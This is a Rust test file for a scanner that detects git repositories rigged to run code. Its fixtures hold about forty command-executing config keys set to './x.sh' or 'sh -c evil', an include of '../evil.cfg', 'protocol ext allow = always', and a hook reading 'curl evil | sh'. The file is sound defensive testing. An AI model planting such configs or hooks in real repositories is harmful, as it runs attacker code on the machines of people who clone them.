use super::*;

/// One hostile config per documented key, as a repository would carry it.
/// Every row must be found by the scan; the variable names the arm of
/// [`exec_key`] that finds it, so a row whose key is deleted from the list
/// fails by name.
const HOSTILE_CONFIGS: &[(&str, &str)] = &[
    ("core.fsmonitor", "[core]\n\tfsmonitor = ./x.sh\n"),
    ("core.hooksPath", "[core]\n\thooksPath = .githooks\n"),
    ("core.sshCommand", "[core]\n\tsshCommand = sh -c evil\n"),
    ("core.editor", "[core]\n\teditor = ./x.sh\n"),
    ("core.pager", "[core]\n\tpager = ./x.sh\n"),
    ("core.askPass", "[core]\n\taskPass = ./x.sh\n"),
    ("core.gitProxy", "[core]\n\tgitProxy = ./x.sh\n"),
    (
        "core.alternateRefsCommand",
        "[core]\n\talternateRefsCommand = ./x.sh\n",
    ),
    ("sequence.editor", "[sequence]\n\teditor = ./x.sh\n"),
    (
        "interactive.diffFilter",
        "[interactive]\n\tdiffFilter = ./x.sh\n",
    ),
    ("alias.*", "[alias]\n\tst = !sh -c evil\n"),
    ("pager.<cmd>", "[pager]\n\tlog = ./x.sh\n"),
    (
        "filter.<driver>.clean",
        "[filter \"x\"]\n\tclean = ./x.sh\n",
    ),
    (
        "filter.<driver>.smudge",
        "[filter \"x\"]\n\tsmudge = ./x.sh\n",
    ),
    (
        "filter.<driver>.process",
        "[filter \"x\"]\n\tprocess = ./x.sh\n",
    ),
    (
        "diff.<driver>.textconv",
        "[diff \"x\"]\n\ttextconv = ./x.sh\n",
    ),
    (
        "diff.<driver>.command",
        "[diff \"x\"]\n\tcommand = ./x.sh\n",
    ),
    ("diff.external", "[diff]\n\texternal = ./x.sh\n"),
    (
        "merge.<driver>.driver",
        "[merge \"x\"]\n\tdriver = ./x.sh\n",
    ),
    (
        "<diff|merge>tool.<tool>.cmd",
        "[mergetool \"x\"]\n\tcmd = ./x.sh\n",
    ),
    (
        "<diff|merge>tool.<tool>.path",
        "[difftool \"x\"]\n\tpath = ./x.sh\n",
    ),
    (
        "browser.<tool>.<cmd|path>",
        "[browser \"x\"]\n\tcmd = ./x.sh\n",
    ),
    ("web.browser", "[web]\n\tbrowser = ./x.sh\n"),
    ("man.<tool>.<cmd|path>", "[man \"x\"]\n\tcmd = ./x.sh\n"),
    ("instaweb.<httpd|browser>", "[instaweb]\n\thttpd = ./x.sh\n"),
    (
        "credential[.<url>].helper",
        "[credential]\n\thelper = !./x.sh\n",
    ),
    (
        "gpg[.<format>].program",
        "[gpg \"ssh\"]\n\tprogram = ./x.sh\n",
    ),
    (
        "gpg.ssh.defaultKeyCommand",
        "[gpg \"ssh\"]\n\tdefaultKeyCommand = ./x.sh\n",
    ),
    (
        "trailer.<key-alias>.<cmd|command>",
        "[trailer \"x\"]\n\tcmd = ./x.sh\n",
    ),
    (
        "hook.<friendly-name>.command",
        "[hook \"x\"]\n\tcommand = ./x.sh\n\tevent = pre-commit\n",
    ),
    (
        "sendemail.<sendmailCmd|toCmd|ccCmd|headerCmd|smtpServer>",
        "[sendemail]\n\ttoCmd = ./x.sh\n",
    ),
    ("include.path", "[include]\n\tpath = ../evil.cfg\n"),
    (
        "includeIf.<condition>.path",
        "[includeIf \"gitdir:/\"]\n\tpath = ../evil.cfg\n",
    ),
    (
        "uploadpack.packObjectsHook",
        "[uploadpack]\n\tpackObjectsHook = ./x.sh\n",
    ),
    (
        "remote.<name>.uploadpack",
        "[remote \"o\"]\n\tuploadpack = ./x.sh\n",
    ),
    (
        "remote.<name>.receivepack",
        "[remote \"o\"]\n\treceivepack = ./x.sh\n",
    ),
    ("remote.<name>.vcs", "[remote \"o\"]\n\tvcs = x\n"),
    (
        "protocol[.<name>].allow",
        "[protocol \"ext\"]\n\tallow = always\n",
    ),
    (
        "submodule.<name>.update=!<command>",
        "[submodule \"s\"]\n\tupdate = !./x.sh\n",
    ),
];

fn workspace() -> tempfile::TempDir {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(tmp.path().join(".git/hooks")).unwrap();
    std::fs::create_dir_all(tmp.path().join(".git/objects/ab")).unwrap();
    std::fs::write(
        tmp.path().join(".git/config"),
        "[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.invalid/r.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[submodule \"s\"]\n\tupdate = checkout\n",
    )
    .unwrap();
    std::fs::write(tmp.path().join("README"), "a repo").unwrap();
    tmp
}

#[test]
fn every_hostile_key_is_found_by_its_documented_name() {
    for (variable, config) in HOSTILE_CONFIGS {
        let w = workspace();
        std::fs::write(w.path().join(".git/config"), config).unwrap();
        let found = scan(w.path()).unwrap();
        assert!(
            found.iter().any(|f| matches!(
                f,
                Finding::ConfigKey { key, path, .. } if key.variable == *variable && path == ".git/config"
            )),
            "{variable}: {found:?}"
        );
    }
}

#[test]
fn a_clean_repository_and_one_with_only_sample_hooks_have_no_finding() {
    let w = workspace();
    assert_eq!(
        scan(w.path()).unwrap(),
        Vec::new(),
        "the control: a clean clone"
    );
    for hook in [
        "pre-commit.sample",
        "pre-push.sample",
        "fsmonitor-watchman.sample",
    ] {
        std::fs::write(
            w.path().join(".git/hooks").join(hook),
            "#!/bin/sh\nexit 1\n",
        )
        .unwrap();
    }
    assert_eq!(scan(w.path()).unwrap(), Vec::new());
}

#[test]
fn a_hook_is_found_in_the_repository_and_in_a_submodule() {
    let w = workspace();
    std::fs::write(w.path().join(".git/hooks/post-checkout"), "curl evil | sh").unwrap();
    let sub = w.path().join(".git/modules/vendor/lib/hooks");
    std::fs::create_dir_all(&sub).unwrap();
    std::fs::write(sub.join("pre-commit"), "evil").unwrap();
    let found = scan(w.path()).unwrap();
    assert_eq!(
        found,
        vec![
            Finding::Hook {
                path: ".git/hooks/post-checkout".into()
            },
            Finding::Hook {
                path: ".git/modules/vendor/lib/hooks/pre-commit".into()
            },
        ]
    );
}

#[test]
fn a_nested_repository_is_scanned_wherever_it_hides() {
    let w = workspace();
    let nested = w.path().join("node_modules/pkg/.git");
    std::fs::create_dir_all(&nested).unwrap();
    std::fs::write(nested.join("config"), "[core]\n\tfsmonitor = ./x\n").unwrap();
    let found = scan(w.path()).unwrap();
    assert_eq!(found.len(), 1, "{found:?}");
    assert!(found[0]
        .to_string()
        .contains("node_modules/pkg/.git/config"));
}

#[test]
fn a_gitlink_is_followed_inside_and_reported_outside() {
    let w = workspace();
    std::fs::create_dir_all(w.path().join("vendor/lib")).unwrap();
    std::fs::write(
        w.path().join("vendor/lib/.git"),
        "gitdir: ../../.git/modules/lib\n",
    )
    .unwrap();
    assert_eq!(
        scan(w.path()).unwrap(),
        Vec::new(),
        "inside: the scan already reads it"
    );
    std::fs::write(
        w.path().join("vendor/lib/.git"),
        "gitdir: /home/someone/evil\n",
    )
    .unwrap();
    assert!(matches!(
        scan(w.path()).unwrap().as_slice(),
        [Finding::PointsOutside { path, .. }] if path == "vendor/lib/.git"
    ));
    std::fs::write(
        w.path().join("vendor/lib/.git"),
        "gitdir: ../../../escape\n",
    )
    .unwrap();
    assert_eq!(scan(w.path()).unwrap().len(), 1);
}

#[cfg(unix)]
#[test]
fn a_symlinked_git_config_or_directory_is_not_followed_and_is_reported() {
    let w = workspace();
    let outside = tempfile::tempdir().unwrap();
    std::fs::write(outside.path().join("config"), "[core]\n\tfsmonitor = x\n").unwrap();
    std::fs::remove_file(w.path().join(".git/config")).unwrap();
    std::os::unix::fs::symlink(outside.path().join("config"), w.path().join(".git/config"))
        .unwrap();
    std::fs::create_dir_all(w.path().join("sub")).unwrap();
    std::os::unix::fs::symlink(outside.path(), w.path().join("sub/.git")).unwrap();
    let found = scan(w.path()).unwrap();
    assert_eq!(found.len(), 2, "{found:?}");
    assert!(found
        .iter()
        .all(|f| matches!(f, Finding::PointsOutside { .. })));
}

#[test]
fn case_does_not_hide_a_git_directory() {
    let w = workspace();
    std::fs::create_dir_all(w.path().join("x/.GIT/HOOKS")).unwrap();
    std::fs::write(w.path().join("x/.GIT/HOOKS/pre-commit"), "evil").unwrap();
    std::fs::write(w.path().join("x/.GIT/CONFIG"), "[CORE]\n\tFSMONITOR = x\n").unwrap();
    assert_eq!(scan(w.path()).unwrap().len(), 2);
}

#[test]
fn a_root_that_cannot_be_read_is_an_error_not_a_clean_scan() {
    let gone = tempfile::tempdir().unwrap().path().join("absent");
    assert!(matches!(scan(&gone), Err(ScanError::Io { .. })));
}

#[test]
fn config_entries_read_sections_subsections_and_continuations() {
    let text = "[filter \"lfs\"]\n\tsmudge = git-lfs smudge\n[diff]\n\texternal = x\n[user]\n\tname = a\n[includeIf \"gitdir:~/\"]\n\tpath = b\n[alias]\n\tx = !a \\\n\tb\n";
    let exec: Vec<String> = config_entries(text)
        .into_iter()
        .filter(|e| e.exec.is_some())
        .map(|e| e.entry)
        .collect();
    assert!(
        exec.contains(&"filter.lfs.smudge=git-lfs smudge".to_string()),
        "{exec:?}"
    );
    assert!(exec.contains(&"diff.external=x".to_string()), "{exec:?}");
    assert!(
        exec.contains(&"includeif.gitdir:~/.path=b".to_string()),
        "{exec:?}"
    );
    assert!(!exec.iter().any(|x| x.starts_with("user.")), "{exec:?}");
    let alias = config_entries(text)
        .into_iter()
        .find(|e| e.entry.starts_with("alias."))
        .unwrap();
    assert_eq!(alias.lines.len(), 2, "a continued value spans both lines");
}

#[test]
fn a_key_on_the_section_header_line_is_read() {
    let e = config_entries("[core] fsmonitor = ./x\n");
    assert!(e[0].exec.is_some(), "{e:?}");
}

#[test]
fn an_ordinary_submodule_update_mode_is_not_a_command() {
    assert_eq!(exec_key("submodule", Some("s"), "update", "rebase"), None);
    assert!(exec_key("submodule", Some("s"), "update", "!x").is_some());
}

#[test]
fn hook_and_config_paths() {
    assert!(is_git_hook(".git/hooks/pre-commit"));
    assert!(is_git_hook("a/.git/modules/b/hooks/post-merge"));
    assert!(!is_git_hook(".git/hooks/pre-commit.sample"));
    assert!(!is_git_hook("hooks/pre-commit"));
    assert!(!is_git_hook(".git/hooks"));
    assert!(is_git_config(".git/config"));
    assert!(is_git_config(".git/worktrees/w/config.worktree"));
    assert!(!is_git_config("config"));
    assert!(is_git_data_dir(".git/objects"));
    assert!(!is_git_data_dir("objects"));
}
